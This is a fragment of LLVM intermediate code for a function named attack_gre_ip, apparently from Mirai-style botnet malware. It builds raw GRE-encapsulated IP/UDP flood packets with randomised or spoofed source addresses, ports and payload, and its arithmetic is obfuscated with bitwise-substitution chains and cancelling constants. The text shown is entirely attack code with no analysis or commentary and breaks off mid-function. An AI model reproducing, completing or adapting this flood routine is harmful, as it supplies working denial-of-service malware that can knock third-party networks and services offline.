declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 19, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = sub i64 0, %81
  %83 = sub i64 %79, %82
  %84 = add nsw i64 %79, %81
  %85 = trunc i64 %83 to i32
  store i32 %85, i32* %24, align 4
  %86 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %86, i32* %12, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %5
  br label %589

; <label>:89:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %90 = load i32, i32* %12, align 4
  %91 = bitcast i32* %11 to i8*
  %92 = call i32 @setsockopt(i32 %90, i32 0, i32 3, i8* %91, i32 4) #6
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %97

; <label>:94:                                     ; preds = %89
  %95 = load i32, i32* %12, align 4
  %96 = call i32 @close(i32 %95)
  br label %589

; <label>:97:                                     ; preds = %89
  store i32 0, i32* %11, align 4
  br label %98

; <label>:98:                                     ; preds = %349, %97
  %99 = load i32, i32* %11, align 4
  %100 = load i8, i8* %7, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  br i1 %102, label %103, label %354

; <label>:103:                                    ; preds = %98
  %104 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %105 = load i8**, i8*** %13, align 8
  %106 = load i32, i32* %11, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8*, i8** %105, i64 %107
  store i8* %104, i8** %108, align 8
  %109 = load i8**, i8*** %13, align 8
  %110 = load i32, i32* %11, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8*, i8** %109, i64 %111
  %113 = load i8*, i8** %112, align 8
  %114 = bitcast i8* %113 to %struct.iphdr*
  store %struct.iphdr* %114, %struct.iphdr** %25, align 8
  %115 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %116 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %115, i64 1
  %117 = bitcast %struct.iphdr* %116 to %struct.grehdr*
  store %struct.grehdr* %117, %struct.grehdr** %26, align 8
  %118 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %119 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %118, i64 1
  %120 = bitcast %struct.grehdr* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %27, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.udphdr*
  store %struct.udphdr* %123, %struct.udphdr** %28, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %125 = bitcast %struct.iphdr* %124 to i8*
  %126 = load i8, i8* %125, align 4
  %127 = xor i8 15, -1
  %128 = xor i8 %126, %127
  %129 = and i8 %128, %126
  %130 = and i8 %126, 15
  %131 = xor i8 %129, -1
  %132 = xor i8 64, -1
  %133 = xor i8 25, -1
  %134 = and i8 %131, 25
  %135 = and i8 %129, %133
  %136 = and i8 %132, 25
  %137 = and i8 64, %133
  %138 = or i8 %134, %135
  %139 = or i8 %136, %137
  %140 = xor i8 %138, %139
  %141 = or i8 %131, %132
  %142 = xor i8 %141, -1
  %143 = or i8 25, %133
  %144 = and i8 %142, %143
  %145 = or i8 %140, %144
  %146 = or i8 %129, 64
  store i8 %145, i8* %125, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = xor i8 -16, -1
  %151 = xor i8 %149, %150
  %152 = and i8 %151, %149
  %153 = and i8 %149, -16
  %154 = xor i8 %152, -1
  %155 = xor i8 5, -1
  %156 = xor i8 -69, -1
  %157 = and i8 %154, -69
  %158 = and i8 %152, %156
  %159 = and i8 %155, -69
  %160 = and i8 5, %156
  %161 = or i8 %157, %158
  %162 = or i8 %159, %160
  %163 = xor i8 %161, %162
  %164 = or i8 %154, %155
  %165 = xor i8 %164, -1
  %166 = or i8 -69, %156
  %167 = and i8 %165, %166
  %168 = or i8 %163, %167
  %169 = or i8 %152, 5
  store i8 %168, i8* %148, align 4
  %170 = load i8, i8* %14, align 1
  %171 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 1
  store i8 %170, i8* %172, align 1
  %173 = load i32, i32* %20, align 4
  %174 = sext i32 %173 to i64
  %175 = sub i64 52, 1877165389874312973
  %176 = add i64 %175, %174
  %177 = add i64 %176, 1877165389874312973
  %178 = add i64 52, %174
  %179 = trunc i64 %177 to i16
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 2
  store i16 %180, i16* %182, align 2
  %183 = load i16, i16* %15, align 2
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 3
  store i16 %184, i16* %186, align 4
  %187 = load i8, i8* %16, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 5
  store i8 %187, i8* %189, align 4
  %190 = load i8, i8* %17, align 1
  %191 = icmp ne i8 %190, 0
  br i1 %191, label %192, label %196

; <label>:192:                                    ; preds = %103
  %193 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 4
  store i16 %193, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %103
  %197 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 6
  store i8 47, i8* %198, align 1
  %199 = load i32, i32* %23, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 8
  store i32 %199, i32* %201, align 4
  %202 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %203 = load i32, i32* %11, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i32 0, i32 1
  %207 = load i32, i32* %206, align 4
  %208 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 9
  store i32 %207, i32* %209, align 4
  %210 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %211 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %212 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %211, i32 0, i32 1
  store i16 %210, i16* %212, align 2
  %213 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %214 = bitcast %struct.iphdr* %213 to i8*
  %215 = load i8, i8* %214, align 4
  %216 = xor i8 %215, -1
  %217 = xor i8 15, -1
  %218 = xor i8 -113, -1
  %219 = or i8 %216, %217
  %220 = or i8 -113, %218
  %221 = xor i8 %219, -1
  %222 = and i8 %221, %220
  %223 = and i8 %215, 15
  %224 = xor i8 %222, -1
  %225 = xor i8 64, -1
  %226 = xor i8 93, -1
  %227 = and i8 %224, 93
  %228 = and i8 %222, %226
  %229 = and i8 %225, 93
  %230 = and i8 64, %226
  %231 = or i8 %227, %228
  %232 = or i8 %229, %230
  %233 = xor i8 %231, %232
  %234 = or i8 %224, %225
  %235 = xor i8 %234, -1
  %236 = or i8 93, %226
  %237 = and i8 %235, %236
  %238 = or i8 %233, %237
  %239 = or i8 %222, 64
  store i8 %238, i8* %214, align 4
  %240 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %241 = bitcast %struct.iphdr* %240 to i8*
  %242 = load i8, i8* %241, align 4
  %243 = xor i8 -16, -1
  %244 = xor i8 %242, %243
  %245 = and i8 %244, %242
  %246 = and i8 %242, -16
  %247 = xor i8 %245, -1
  %248 = xor i8 5, -1
  %249 = xor i8 -31, -1
  %250 = and i8 %247, -31
  %251 = and i8 %245, %249
  %252 = and i8 %248, -31
  %253 = and i8 5, %249
  %254 = or i8 %250, %251
  %255 = or i8 %252, %253
  %256 = xor i8 %254, %255
  %257 = or i8 %247, %248
  %258 = xor i8 %257, -1
  %259 = or i8 -31, %249
  %260 = and i8 %258, %259
  %261 = or i8 %256, %260
  %262 = or i8 %245, 5
  store i8 %261, i8* %241, align 4
  %263 = load i8, i8* %14, align 1
  %264 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 1
  store i8 %263, i8* %265, align 1
  %266 = load i32, i32* %20, align 4
  %267 = sext i32 %266 to i64
  %268 = sub i64 28, -1444165246955077950
  %269 = add i64 %268, %267
  %270 = add i64 %269, -1444165246955077950
  %271 = add i64 28, %267
  %272 = trunc i64 %270 to i16
  %273 = call zeroext i16 @htons(i16 zeroext %272) #7
  %274 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 2
  store i16 %273, i16* %275, align 2
  %276 = load i16, i16* %15, align 2
  %277 = zext i16 %276 to i32
  %278 = xor i32 %277, -1
  %279 = and i32 -1, %278
  %280 = xor i32 -1, -1
  %281 = and i32 %277, %280
  %282 = or i32 %279, %281
  %283 = xor i32 %277, -1
  %284 = trunc i32 %282 to i16
  %285 = call zeroext i16 @htons(i16 zeroext %284) #7
  %286 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 3
  store i16 %285, i16* %287, align 4
  %288 = load i8, i8* %16, align 1
  %289 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 5
  store i8 %288, i8* %290, align 4
  %291 = load i8, i8* %17, align 1
  %292 = icmp ne i8 %291, 0
  br i1 %292, label %293, label %297

; <label>:293:                                    ; preds = %196
  %294 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 4
  store i16 %294, i16* %296, align 2
  br label %297

; <label>:297:                                    ; preds = %293, %196
  %298 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 6
  store i8 17, i8* %299, align 1
  %300 = call i32 @rand_next()
  %301 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = load i8, i8* %22, align 1
  %304 = icmp ne i8 %303, 0
  br i1 %304, label %305, label %311

; <label>:305:                                    ; preds = %297
  %306 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 9
  %308 = load i32, i32* %307, align 4
  %309 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 9
  store i32 %308, i32* %310, align 4
  br label %331

; <label>:311:                                    ; preds = %297
  %312 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 8
  %314 = load i32, i32* %313, align 4
  %315 = sub i32 0, 1024
  %316 = add i32 %314, %315
  %317 = sub i32 %314, 1024
  %318 = xor i32 %316, -1
  %319 = and i32 -1322670349, %318
  %320 = xor i32 -1322670349, -1
  %321 = and i32 %316, %320
  %322 = xor i32 -1, -1
  %323 = and i32 %322, -1322670349
  %324 = and i32 -1, %320
  %325 = or i32 %319, %321
  %326 = or i32 %323, %324
  %327 = xor i32 %325, %326
  %328 = xor i32 %316, -1
  %329 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 9
  store i32 %327, i32* %330, align 4
  br label %331

; <label>:331:                                    ; preds = %311, %305
  %332 = load i16, i16* %18, align 2
  %333 = call zeroext i16 @htons(i16 zeroext %332) #7
  %334 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %335 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %334, i32 0, i32 0
  store i16 %333, i16* %335, align 2
  %336 = load i16, i16* %19, align 2
  %337 = call zeroext i16 @htons(i16 zeroext %336) #7
  %338 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i32 0, i32 1
  store i16 %337, i16* %339, align 2
  %340 = load i32, i32* %20, align 4
  %341 = sext i32 %340 to i64
  %342 = sub i64 0, %341
  %343 = sub i64 8, %342
  %344 = add i64 8, %341
  %345 = trunc i64 %343 to i16
  %346 = call zeroext i16 @htons(i16 zeroext %345) #7
  %347 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 2
  store i16 %346, i16* %348, align 2
  br label %349

; <label>:349:                                    ; preds = %331
  %350 = load i32, i32* %11, align 4
  %351 = sub i32 0, 1
  %352 = sub i32 %350, %351
  %353 = add nsw i32 %350, 1
  store i32 %352, i32* %11, align 4
  br label %98

; <label>:354:                                    ; preds = %98
  br label %355

; <label>:355:                                    ; preds = %588, %354
  store i32 0, i32* %11, align 4
  br label %356

; <label>:356:                                    ; preds = %577, %355
  %357 = load i32, i32* %11, align 4
  %358 = load i8, i8* %7, align 1
  %359 = zext i8 %358 to i32
  %360 = icmp slt i32 %357, %359
  br i1 %360, label %361, label %582

; <label>:361:                                    ; preds = %356
  %362 = load i8**, i8*** %13, align 8
  %363 = load i32, i32* %11, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds i8*, i8** %362, i64 %364
  %366 = load i8*, i8** %365, align 8
  store i8* %366, i8** %29, align 8
  %367 = load i8*, i8** %29, align 8
  %368 = bitcast i8* %367 to %struct.iphdr*
  store %struct.iphdr* %368, %struct.iphdr** %30, align 8
  %369 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %370 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %369, i64 1
  %371 = bitcast %struct.iphdr* %370 to %struct.grehdr*
  store %struct.grehdr* %371, %struct.grehdr** %31, align 8
  %372 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %373 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %372, i64 1
  %374 = bitcast %struct.grehdr* %373 to %struct.iphdr*
  store %struct.iphdr* %374, %struct.iphdr** %32, align 8
  %375 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i64 1
  %377 = bitcast %struct.iphdr* %376 to %struct.udphdr*
  store %struct.udphdr* %377, %struct.udphdr** %33, align 8
  %378 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %379 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %378, i64 1
  %380 = bitcast %struct.udphdr* %379 to i8*
  store i8* %380, i8** %34, align 8
  %381 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %382 = load i32, i32* %11, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i32 0, i32 2
  %386 = load i8, i8* %385, align 4
  %387 = zext i8 %386 to i32
  %388 = icmp slt i32 %387, 32
  br i1 %388, label %389, label %414

; <label>:389:                                    ; preds = %361
  %390 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %391 = load i32, i32* %11, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i64 %392
  %394 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i32 0, i32 1
  %395 = load i32, i32* %394, align 4
  %396 = call i32 @ntohl(i32 %395) #7
  %397 = call i32 @rand_next()
  %398 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %399 = load i32, i32* %11, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i32 0, i32 2
  %403 = load i8, i8* %402, align 4
  %404 = zext i8 %403 to i32
  %405 = lshr i32 %397, %404
  %406 = sub i32 0, %396
  %407 = sub i32 0, %405
  %408 = add i32 %406, %407
  %409 = sub i32 0, %408
  %410 = add i32 %396, %405
  %411 = call i32 @htonl(i32 %409) #7
  %412 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 9
  store i32 %411, i32* %413, align 4
  br label %414

; <label>:414:                                    ; preds = %389, %361
  %415 = load i32, i32* %23, align 4
  %416 = icmp eq i32 %415, -1
  br i1 %416, label %417, label %421

; <label>:417:                                    ; preds = %414
  %418 = call i32 @rand_next()
  %419 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 8
  store i32 %418, i32* %420, align 4
  br label %421

; <label>:421:                                    ; preds = %417, %414
  %422 = load i16, i16* %15, align 2
  %423 = zext i16 %422 to i32
  %424 = icmp eq i32 %423, 65535
  br i1 %424, label %425, label %450

; <label>:425:                                    ; preds = %421
  %426 = call i32 @rand_next()
  %427 = xor i32 65535, -1
  %428 = xor i32 %426, %427
  %429 = and i32 %428, %426
  %430 = and i32 %426, 65535
  %431 = trunc i32 %429 to i16
  %432 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 3
  store i16 %431, i16* %433, align 4
  %434 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  %436 = load i16, i16* %435, align 4
  %437 = zext i16 %436 to i32
  %438 = sub i32 0, 1000
  %439 = add i32 %437, %438
  %440 = sub nsw i32 %437, 1000
  %441 = xor i32 %439, -1
  %442 = and i32 -1, %441
  %443 = xor i32 -1, -1
  %444 = and i32 %439, %443
  %445 = or i32 %442, %444
  %446 = xor i32 %439, -1
  %447 = trunc i32 %445 to i16
  %448 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 3
  store i16 %447, i16* %449, align 4
  br label %450

; <label>:450:                                    ; preds = %425, %421
  %451 = load i16, i16* %18, align 2
  %452 = zext i16 %451 to i32
  %453 = icmp eq i32 %452, 65535
  br i1 %453, label %454, label %463

; <label>:454:                                    ; preds = %450
  %455 = call i32 @rand_next()
  %456 = xor i32 65535, -1
  %457 = xor i32 %455, %456
  %458 = and i32 %457, %455
  %459 = and i32 %455, 65535
  %460 = trunc i32 %458 to i16
  %461 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %462 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %461, i32 0, i32 0
  store i16 %460, i16* %462, align 2
  br label %463

; <label>:463:                                    ; preds = %454, %450
  %464 = load i16, i16* %19, align 2
  %465 = zext i16 %464 to i32
  %466 = icmp eq i32 %465, 65535
  br i1 %466, label %467, label %480

; <label>:467:                                    ; preds = %463
  %468 = call i32 @rand_next()
  %469 = xor i32 %468, -1
  %470 = xor i32 65535, -1
  %471 = xor i32 -1008266054, -1
  %472 = or i32 %469, %470
  %473 = or i32 -1008266054, %471
  %474 = xor i32 %472, -1
  %475 = and i32 %474, %473
  %476 = and i32 %468, 65535
  %477 = trunc i32 %475 to i16
  %478 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %479 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %478, i32 0, i32 1
  store i16 %477, i16* %479, align 2
  br label %480

; <label>:480:                                    ; preds = %467, %463
  %481 = load i8, i8* %22, align 1
  %482 = icmp ne i8 %481, 0
  br i1 %482, label %487, label %483

; <label>:483:                                    ; preds = %480
  %484 = call i32 @rand_next()
  %485 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %486 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %485, i32 0, i32 9
  store i32 %484, i32* %486, align 4
  br label %493

; <label>:487:                                    ; preds = %480
  %488 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 9
  %490 = load i32, i32* %489, align 4
  %491 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 9
  store i32 %490, i32* %492, align 4
  br label %493

; <label>:493:                                    ; preds = %487, %483
  %494 = load i8, i8* %21, align 1
  %495 = icmp ne i8 %494, 0
  br i1 %495, label %496, label %503

; <label>:496:                                    ; preds = %493
  %497 = load i8*, i8** %34, align 8
  %498 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %497, i32 %498)
  %499 = load i8*, i8** %34, align 8
  %500 = load i32, i32* %20, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds i8, i8* %499, i64 %501
  store i8 0, i8* %502, align 1
  br label %503

; <label>:503:                                    ; preds = %496, %493
  %504 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 7
  store i16 0, i16* %505, align 2
  %506 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %507 = bitcast %struct.iphdr* %506 to i16*
  %508 = call zeroext i16 @checksum_generic(i16* %507, i32 20)
  %509 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i32 0, i32 7
  store i16 %508, i16* %510, align 2
  %511 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %512 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %511, i32 0, i32 7
  store i16 0, i16* %512, align 2
  %513 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %514 = bitcast %struct.iphdr* %513 to i16*
  %515 = call zeroext i16 @checksum_generic(i16* %514, i32 20)
  %516 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %517 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %516, i32 0, i32 7
  store i16 %515, i16* %517, align 2
  %518 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %519 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %518, i32 0, i32 3
  store i16 0, i16* %519, align 2
  %520 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %521 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %522 = bitcast %struct.udphdr* %521 to i8*
  %523 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %524 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %523, i32 0, i32 2
  %525 = load i16, i16* %524, align 2
  %526 = load i32, i32* %20, align 4
  %527 = sext i32 %526 to i64
  %528 = sub i64 8, 2362351064258821883
  %529 = add i64 %528, %527
  %530 = add i64 %529, 2362351064258821883
  %531 = add i64 8, %527
  %532 = trunc i64 %530 to i32
  %533 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %520, i8* %522, i16 zeroext %525, i32 %532)
  %534 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %535 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %534, i32 0, i32 3
  store i16 %533, i16* %535, align 2
  %536 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %537 = load i32, i32* %11, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i64 %538
  %540 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %539, i32 0, i32 0
  %541 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %540, i32 0, i32 0
  store i16 2, i16* %541, align 4
  %542 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %543 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %542, i32 0, i32 9
  %544 = load i32, i32* %543, align 4
  %545 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %546 = load i32, i32* %11, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %545, i64 %547
  %549 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %548, i32 0, i32 0
